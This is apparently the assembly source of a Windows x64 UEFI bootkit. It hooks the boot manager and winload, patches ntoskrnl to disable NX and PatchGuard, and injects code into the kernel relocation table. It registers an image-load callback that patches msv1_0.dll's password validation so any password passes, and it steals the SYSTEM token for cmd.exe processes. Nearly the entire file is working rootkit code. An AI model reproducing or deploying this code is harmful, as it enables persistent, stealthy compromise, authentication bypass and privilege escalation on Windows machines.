

PUBLIC BOOTMGFW_Archpx64TransferTo64BitApplicationAsm_saved_bytes

CR0_WP_CLEAR_MASK equ 0fffeffffh	; Desactivate WP with CR0
CR0_WP_SET_MASK equ 010000h			; Activate WP with CR0


.data

; FIRST STAGE PATCH saved bytes
BOOTMGFW_Archpx64TransferTo64BitApplicationAsm_saved_bytes db 9 dup(0)

; SECOND STAGE PATCH saved bytes, pattern
EXTERN WINLOAD_PATTERN_OslArchTransferToKernel:db
EXTERN WINLOAD_PATTERN_OslArchTransferToKernel_size:qword
WINLOAD_OslArchTransferToKernel_saved_bytes db 9 dup(0)  ; mov (cs:ArchpChildAppEntryRoutine)

; THIRD STAGE PATCH
EXTERN NTOSKRNL_PATTERN_NXFlag:db
EXTERN NTOSKRNL_PATTERN_NXFlag_size:qword
EXTERN NTOSKRNL_PATTERN_PATCHGUARD:db
EXTERN NTOSKRNL_PATTERN_PATCHGUARD_size:qword

EXTERN CRC32_TAB:dw

.code 
ALIGN 16

;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;
;; bootmgfw.efi hooking
;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;
bootmgfw_Archpx64TransferTo64BitApplicationAsm_hook proc

	push rax	; rax is a ptr to winload.exe entry point bytes

; Save some reg to do our job
	push rbx
	push rcx
	push rdx
	push rsi
	push rdi

	xor rcx,rcx

; Search image base
	and ax, 0F000h
imagebase_search:
	cmp word ptr [rax],05A4Dh
	je imagebase_findsize
	sub rax,01000h
	jmp imagebase_search

; Get image size in PE
imagebase_findsize:
	mov ecx, dword ptr[rax+03Ch]			; get e_lfanew from DOS headers
	mov ecx, dword ptr[rax+rcx+050h]		; get sizeOfImage from OptionialHeader in PE

; Search for pattern
	lea rsi, WINLOAD_PATTERN_OslArchTransferToKernel
	sub rcx,WINLOAD_PATTERN_OslArchTransferToKernel_size
	xor rbx,rbx
	xor rdx,rdx

pattern_search_loop:
	cmp rdx,rcx
	jae bootmgfw_Archpx64TransferTo64BitApplicationAsm_hook_exit
	push rcx
	mov cl,byte ptr[rsi+rbx]
	cmp cl,byte ptr[rax+rbx]
	pop rcx
	jne pattern_search_continue
	inc rbx
	cmp rbx,WINLOAD_PATTERN_OslArchTransferToKernel_size
	jae proceed_save_bytes
	jmp pattern_search_loop
pattern_search_continue:
	xor rbx,rbx
	inc rax
	inc rdx
	jmp pattern_search_loop

; Save old bytes
proceed_save_bytes:
	lea rdi,WINLOAD_OslArchTransferToKernel_saved_bytes
	mov rsi,rax
	mov rcx,9
	rep movsb byte ptr[rdi], byte ptr[rsi]

; Make hook
	mov byte ptr[rax], 0E8h
	lea ebx, winload_OslArchTransferToKernel_hook
	lea ecx, [eax+5]
	sub ebx,ecx
	mov dword ptr[rax+1], ebx

; restore saved reg and go back in the cloud by restoring patched bytes \o/
bootmgfw_Archpx64TransferTo64BitApplicationAsm_hook_exit:
	lea rsi, BOOTMGFW_Archpx64TransferTo64BitApplicationAsm_saved_bytes
	mov rdi, qword ptr[esp+030h]
	sub rdi,5
	mov rcx, 5
	rep movsb byte ptr[rdi], byte ptr[rsi]
	sub qword ptr[esp+030h],5
	pop rdi
	pop rsi
	pop rdx
	pop rcx
	pop rbx
	pop rax
	ret

bootmgfw_Archpx64TransferTo64BitApplicationAsm_hook endp
 

;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;
;; winload.exe hooking
;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;
winload_OslArchTransferToKernel_hook proc
	push rdx				; rdx is ptr to ntoskrnl:kiSystemStartup (main function)

	; Save some reg to do our job
	push rcx
	push rbx
	push rax
	push rdi
	push rsi

	; Search image base
	and dx, 0F000h
kernel_imagebase_search:
	cmp word ptr [rdx],05A4Dh
	je kernel_get_image_size
	sub rdx,01000h
	jmp kernel_imagebase_search

	; Search for NX flag pattern in image
kernel_get_image_size:
	mov ecx, dword ptr[rdx+03Ch]			; get e_lfanew from DOS headers
	mov ebx, dword ptr[rdx+rcx+050h]		; get sizeOfImage from OptionialHeader in PE

	; Bye bye NX flag :)
cancel_NX_FLAG:
	lea rcx, NTOSKRNL_PATTERN_NXFlag
	sub rbx,NTOSKRNL_PATTERN_NXFlag_size
	push rdx
	mov rax,rdx
	mov rdx,NTOSKRNL_PATTERN_NXFlag_size
	call kernel_find_pattern
	cmp rax,0 
	je winload_OslArchTransferToKernel_hook_exit
	mov byte ptr[rax],0EBh
	mov NTOSKRNL_NxPatchAddr,rax

	; Bye bye patch guard :)
	mov rax,[rsp]
	lea rcx,NTOSKRNL_PATTERN_PATCHGUARD
	mov rdx,NTOSKRNL_PATTERN_PATCHGUARD_size
	call kernel_find_pattern
	cmp rax,0 
	je winload_OslArchTransferToKernel_hook_exit
	mov dword ptr[rax+2],090D23148h
	mov word ptr[rax+6],09090h
	mov byte ptr[rax+8],090h

	; Get NtSetInformationThread and PsSetLoadImageNotifyRoutine APi addr
kernel_get_exports:
	pop rdx
	xor rbx,rbx
	mov ebx, dword ptr[rdx+03Ch]						; get e_lfanew from DOS headers
	lea rbx, [rdx+rbx]									; get PE full addr
	mov rax,rdx
	call kernel_get_exports_to_hook
	
	; Save NtSetInformationThread first bytes
	mov rsi,qword ptr [NTOSKRNL_API_ep]
	lea rdi,NTOSKRNL_NtSetInformationThread_saved_bytes
	mov rcx,10
	rep movsb byte ptr[rdi], byte ptr[rsi]

	; Inject code + data in reloc table
	mov edi,dword ptr[rbx+0B0h]							; PE.offset_reloc_table
	add rdi,rdx	
	mov ebx,dword ptr[rbx+0B4h]							; PE.offset_reloc_table_size
	test ebx,ebx
	jz winload_OslArchTransferToKernel_hook_exit2		; Exit if Relocation table is empty
	lea rsi,ntoskrnl_inj_beginning
	mov ecx,(ntoskrnl_inj_end-ntoskrnl_inj_beginning)
	push rdi											; Save reloc table full	addr
	rep movsb byte ptr[rdi], byte ptr[rsi]

	; Hook nt!NtSetInformationthread
	mov rax,qword ptr [NTOSKRNL_API_ep]
	mov byte ptr[rax],0E8h
	pop rbx						; Get back reloc table full addr
	lea rcx, [rax+5]
	sub rbx,rcx
	mov dword ptr[rax+1],ebx
	jmp winload_OslArchTransferToKernel_hook_exit2

	; restore saved reg and go back in the cloud by restoring patched bytes \o/
winload_OslArchTransferToKernel_hook_exit:
	pop rdx
winload_OslArchTransferToKernel_hook_exit2:
	lea rsi, WINLOAD_OslArchTransferToKernel_saved_bytes
	mov rdi, qword ptr[esp+030h]
	sub rdi,5
	mov rcx, 9
	rep movsb byte ptr[rdi], byte ptr[rsi]
	sub qword ptr[esp+030h],5
	pop rsi
	pop rdi
	pop rax
	pop rbx
	pop rcx
	pop rdx
	ret
winload_OslArchTransferToKernel_hook endp


; Find a pattern in kernel
; RAX = base_ptr
; RBX = base_size
; RCX = pattern_ptr
; RDX = pattern_size
kernel_find_pattern:
	push rcx
	push r8
	push r9
	xor r8,r8
	xor r9,r9
kernel_pattern_search_loop:
	cmp r9,rbx
	jae kernel_pattern_search_exit_error
	push rcx
	mov cl,byte ptr[rcx+r8]
	cmp cl,byte ptr[rax+r8]
	pop rcx
	jne kernel_pattern_search_continue
	inc r8
	cmp r8,rdx
	jae kernel_pattern_search_exit
	jmp kernel_pattern_search_loop
kernel_pattern_search_continue:
	xor r8,r8
	inc rax
	inc r9
	jmp kernel_pattern_search_loop
kernel_pattern_search_exit_error:
	xor rax,rax
	jmp kernel_pattern_search_exit
kernel_pattern_search_exit:
	pop r9
	pop r8
	pop rcx
	ret

; Resolve image export and store function entry point in global :
; RAX = ptr to image base
; RBX = ptr to PE image header
kernel_get_exports_to_hook:
	push r12
	push r11
	push r10
	push r9
	push r8
	push rcx
	push rbx
	xor r8,r8
	xor r9,r9
	xor r10,r10
	xor r11,r11
	xor r12,r12
	mov ebx,dword ptr[rbx+088h]			; PE.offset_export_table
	add rbx,rax							; Full address of export table
	mov r8d,dword ptr[rbx+020h]			; export.addressOfNames
	add r8,rax							; Full address of names
	mov r9d,dword ptr[rbx+01ch]			; export.addressOfFunctions
	add r9,rax							; Full address of functions addr table
	mov r10d,dword ptr[rbx+018h]		; Number of names
	mov r11d,dword ptr[rbx+024h]		; export.addressOfOrdinals
	add r11,rax							; Full address of functions ordinals

	xor rcx,rcx
kernel_get_exports_to_hook_next:
	mov ebx,dword ptr[r8]				; Next export name entry
	add rbx,rax							; make full addr
	xor r12,r12
	mov r12w,word ptr[r11+rcx*2]		; Next ordinal
	push rax
	mov r12d,dword ptr[r9+r12*4]		; Next address of function
	add rax,r12							; Next address of function full addr
	call check_export_to_hook			; Check if this export need to be hooked & store it's VA if it needs
	pop rax
	add r8,4							; Proceed with next export name entry
	inc rcx
	dec r10d							; Decrement number of entries to treat
	jnz kernel_get_exports_to_hook_next	; Is it last export?

	pop rbx
	pop rcx
	pop r8
	pop r9
	pop r10
	pop r11
	pop r12
	ret

; Check if given export need to be hooked et if so store its address
; RAX = API addr
; RBX = API name
check_export_to_hook:
	push rsi
	push rdi
	push rdx
	push rcx
	push rax
	mov rsi,rbx
	mov rcx,rax
	call crc32_comp_string					; Get CRC32 of export name string
	mov edx,eax
	lea rsi,NTOSKRNL_API_crc32				; Get address of checksum patterns
	lea rdi,[NTOSKRNL_API_ep-8]				; Get full address of table to store func VA
check_export_to_hook_next:
	add edi,8								; Next checksum store entry
	lodsd									; Get next checksum pattern
	test eax,eax							; Is it last pattern?
	jz check_export_to_hook_exit			; Exit if it's the last
	cmp eax,edx								; Checksums equality ?
	jnz check_export_to_hook_next			; If no, proceed with next checksum
	mov [rdi],rcx							; Store function VA in a table
check_export_to_hook_exit:	
	pop rax		
	pop rcx
	pop rdx	
	pop rdi
	pop rsi
	ret									

; Compute CRC32 of a string without NULL char
; RSI = ptr to a string, result in EAX
crc32_comp_string:
	push rsi
	push rdi
	push rbx
	xor rbx,rbx
	mov eax,0FFFFFFFFh
	lea rdi,CRC32_TAB
crc32_comp_string_loop:
	mov bl,byte ptr[rsi]
	cmp bl,0
	je crc32_comp_string_exit
	xor bl,al
	shr eax,8
	xor eax,dword ptr[ebx*4+rdi]
	inc rsi
	jmp crc32_comp_string_loop
crc32_comp_string_exit:
	not eax
	pop rbx
	pop rdi
	pop rsi
	ret


;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;
;; ntoskrnl.exe injected code in reloc
;; Need NX flag desactivated to be executed
;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;
ntoskrnl_inj_beginning:

; Injected code in ntoskrnl reloc table
; it is called when NtSetInformationThread is called by the hook
ntoskrnl_injected_code proc
	pushfq
	push rax
	push rcx
	push rdx
	push rsi
	push rdi

	; Allocate memory for callback
	mov rdx,4096				; NumberOfBytes
	mov rcx,0					; PoolType = NonPagedPoolExecute
	call [NTOSKRNL_API_ep+16]	; ExAllocatePool

	; inject image notify routine callback in it
	lea rsi,image_notify_callback
	mov rdi,rax
	push rdi
	mov ecx, image_notify_callback_end-image_notify_callback
	rep movsb byte ptr[rdi], byte ptr[rsi]

	; call PsSetLoadImageNotifyRoutine
	pop rcx
	call [NTOSKRNL_API_ep+8]


	; Remove NtSetInformationThread hook
	lea rsi, NTOSKRNL_NtSetInformationThread_saved_bytes
	mov rdi, qword ptr[rsp+030h]
	sub rdi,5
	cli
	mov rcx,cr0								; \ 
	and rcx, CR0_WP_CLEAR_MASK				;  | Unprotect kernel memory (not needed before Win 8)
	mov cr0,rcx								; /
	mov rcx, 10
	rep movsb byte ptr[rdi], byte ptr[rsi]

	; Fix NX patch to avoid PatchGuard (not working, TODO; make it work with PG activated )
	mov byte ptr[NTOSKRNL_NxPatchAddr],074h

	mov rcx,cr0								; \   
	or rcx, CR0_WP_SET_MASK					; | Restore kernel memory protection
	mov cr0,rcx								; /
	sti

	; Go back in hooked function
	sub qword ptr[rsp+030h],5
	pop rdi
	pop rsi
	pop rdx
	pop rcx
	pop rax
	popfq
	ret
ntoskrnl_injected_code endp



; Image notidy routine called by kernel each time a PE is loaded in memory
; Look for
; VOID (*PLOAD_IMAGE_NOTIFY_ROUTINE)(
;			__in_opt PUNICODE_STRING  FullImageName,   (RCX)
;			__in HANDLE  ProcessId,					   (RDX)
;			__in PIMAGE_INFO  ImageInfo);			   (RD8)

image_notify_callback proc
	pushfq
	push rsi
	push rdi
	push rax
	push rbx
	push rcx
	push rdx
	
	; Check if it is msv1_0.dll or cmd.exe
	xor rbx,rbx
	mov bx,word ptr[rcx]					; FullImageName byte size
	cmp rbx,20
	jl image_notify_callback_exit
	mov rdi,qword ptr[rcx+8]				; Ptr to FullImageName unicode string
	mov rcx,068006E006F0063h;02E0064006D0063h
	cmp qword ptr[rdi+rbx-016h], rcx ;-00Eh],rcx
	jne image_notify_callback_check_msv1_0
	mov rax,rdx
	call image_notify_callback_escalate_priv
	jmp image_notify_callback_exit

image_notify_callback_check_msv1_0:
	cmp dword ptr[rdi+rbx-014h],073006Dh
	jnz image_notify_callback_exit
	cmp dword ptr[rdi+rbx-010h],0310076h
	jnz image_notify_callback_exit

	; Get image base + size
	mov rdx,qword ptr[r8+8]		; IMAGE_INFO.ImageBase
	mov rcx,qword ptr[r8+018h]	; IMAGE_INFO.ImageSize
	sub rcx,MSV1_0_PATTERN_MsvpPasswordValidate_size
	lea rsi,MSV1_0_PATTERN_MsvpPasswordValidate
	xor rax,rax

	; Search for a pattern
image_notify_callback_search_pattern:
	cmp rax,rcx
	jae image_notify_callback_exit
	push rcx
	mov cl,byte ptr[rsi+rbx]
	cmp cl,byte ptr[rdx+rbx]
	pop rcx
	jne image_notify_callback_search_continue
	inc rbx
	cmp rbx,MSV1_0_PATTERN_MsvpPasswordValidate_size
	jae image_notify_callback_proceed_patch
	jmp image_notify_callback_search_pattern
image_notify_callback_search_continue:
	xor rbx,rbx
	inc rdx
	inc rax
	jmp image_notify_callback_search_pattern

	; Patch hash compare \o/
image_notify_callback_proceed_patch:
	cli
	mov rcx,cr0								; \ 
	and rcx, CR0_WP_CLEAR_MASK				;  | Unprotect kernel memory (not needed before Win 8)
	mov cr0,rcx								; /
	mov dword ptr[rdx],90909090h
	mov word ptr[rdx+4],9090h
	mov rcx,cr0								; \   
	or rcx, CR0_WP_SET_MASK					; | Restore kernel memory protection
	mov cr0,rcx								; /
	sti

	; Go back in the kernel cloud \o/
image_notify_callback_exit:
	pop rdx
	pop rcx
	pop rbx
	pop rax
	pop rdi
	pop rsi
	popfq
	ret

; Escalate priv of a process
; RAX = PID handle
image_notify_callback_escalate_priv:
	push rsi
	push rdi
	push rcx
	push rdx
	push r8
	push r9
	cli
    mov rdx, gs:[188h]      ; _ETHREAD pointer from KPCR
    mov r8, [rdx+0B8h]      ; _EPROCESS (see PsGetCurrentProcess function)
    mov r9, [r8+2E8h]       ; ActiveProcessLinks list head
 
    mov rcx, [r9]           ;follow link to first process in list
find_system_proc:
    mov rdx, [rcx-8]        ; offset from _EPROCESSActiveProcessLinks to _EPROCESSUniqueProcessId
    cmp rdx, 4              ; System process always has PID=4
    jz found_it
    mov rcx, [rcx]          ; follow _LIST_ENTRY Flink pointer
    cmp rcx, r9             ; see if back at list head
    jnz find_system_proc

found_it:
	 mov r8, [r9]           ; follow link to first process in list
find_target_proc:
    lea rsi,CMD_EXE_SZ
	lea rdi,[r8+0150h]		; _EPROCESS.ImageFileName
	push rcx
	mov rcx,7
	repe cmpsb byte ptr[rdi], byte ptr[rsi]
	pop rcx
	jz found_all
    mov r8, [r8]           ;follow _LIST_ENTRY Flink pointer
    cmp r8, r9             ;see if back at list head
    jnz find_target_proc
 
found_all:
    mov rdx, [rcx+60h]     ; offset from ActiveProcessLinks to System token (_EPROCESS.Token)
    and dl, 0f0h           ; clear low 4 bits of _EX_FAST_REF structure
    mov [r8+60h], rdx      ; replace target process token (_EPROCESS.Token) with system token
	sti
    pop r9
	pop r8
	pop rdx
	pop rcx
	pop rdi
	pop rsi
	ret

image_notify_callback endp

; Injected data
MSV1_0_PATTERN_MsvpPasswordValidate db 0Fh,085h,0A8h,0B2h,00h,00h,66h,0B8h,001h,00h,48h,08Bh
MSV1_0_PATTERN_MsvpPasswordValidate_size qword 12

CMD_EXE_SZ db 'cmd.exe',0

image_notify_callback_end:

NTOSKRNL_API_crc32 dword 0466F2056h,04317DE92h,0D17C941Eh,0	; ("NtSetInformationThread","PsSetLoadImageNotifyRoutine","ExAllocatePool",0)
NTOSKRNL_API_ep qword 3 dup(0)								; API entry point
NTOSKRNL_NxPatchAddr qword 0

NTOSKRNL_NtSetInformationThread_saved_bytes db 10 dup(0)

ntoskrnl_inj_end:

end 